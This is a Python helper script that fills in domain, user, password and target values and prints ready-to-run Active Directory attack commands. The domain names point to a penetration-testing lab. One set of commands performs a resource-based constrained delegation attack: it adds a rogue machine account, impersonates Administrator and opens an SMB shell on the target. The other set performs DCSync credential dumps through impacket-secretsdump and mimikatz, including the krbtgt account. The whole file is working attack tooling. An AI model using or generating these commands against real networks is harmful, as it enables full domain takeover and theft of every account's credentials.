import argparse
import re
import string
import random

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def replace_and_print(s):
    for k in varmap:
        if varmap[k] is not None:
            s = s.replace('{{%s}}' % k, varmap[k])
    
    no_match = re.findall('{{[\w]+}}', s)
    for k in no_match:
        s = s.replace(k, bcolors.WARNING + k + bcolors.ENDC)
    print(s + '\n')


def rbcd():
    print('[RBCD] Linux')
    evil_computer = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) + '$'
    command = '''impacket-addcomputer -dc-ip {{dc_ip}} -computer-name '{{evil_computer}}' -computer-pass 'Passw0rd!' {{domain}}/{{username}}:{{password}}
impacket-rbcd -dc-ip {{dc_ip}} -action write -delegate-from '{{evil_computer}}' -delegate-to '{{target_computer}}$' {{domain}}/{{username}}:{{password}}
unset KRB5CCNAME
impacket-getST -dc-ip {{dc_ip}} -impersonate Administrator -spn cifs/{{target_computer}}.{{domain}} '{{domain}}/{{evil_computer}}:Passw0rd!'
export KRB5CCNAME=Administrator.ccache
impacket-smbexec -k -no-pass {{target_computer}}.prod.corp1.com -debug'''.replace('{{evil_computer}}', evil_computer)
    replace_and_print(command)


def dcsync():
    print('[DCSync] Linux')
    command = '''impacket-secretsdump -k -no-pass -just-dc {{dc_host}}
impacket-secretsdump -just-dc -hashes {{hashes}} prod.corp1.com/{{username}}@{{dc_ip}}
impacket-secretsdump -just-dc prod.corp1.com/'{{username}}':'{{password}}'@{{dc_ip}}
'''
    replace_and_print(command)

    print('[DCSync] Windows')
    command = '''lsadump::dcsync /domain:{{domain}} /all
mimikatz.exe "lsadump::dcsync /domain:{{domain}} /user:{{domain}}\krbtgt" "exit"
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:{{domain}} /user:{{domain}}\krbtgt"'
'''
    replace_and_print(command)


parser = argparse.ArgumentParser()
parser.add_argument('-domain', action='store', metavar='domain', help='Domain')
parser.add_argument('-username', action='store', metavar='username', help='username')
parser.add_argument('-password', action='store', metavar='password', help='password')
parser.add_argument('-hashes', action='store', metavar='password', help='LM:NTLM')
parser.add_argument('-target-computer', action='store', metavar='target-computer', help='Target-computer')

parser.add_argument('-dc-ip', action='store', metavar='ip address', help='IP Address of the domain controller.')
parser.add_argument('-dc-host', action='store', metavar='ip address', help='Hostname of the domain controller.')

args = parser.parse_args()
varmap = dict()
varmap['dc_ip'] = args.dc_ip
varmap['dc_host'] = args.dc_host
varmap['domain'] = args.domain
varmap['username'] = args.username
varmap['password'] = args.password
varmap['hashes'] = args.hashes
varmap['target_computer'] = args.target_computer

rbcd()
dcsync()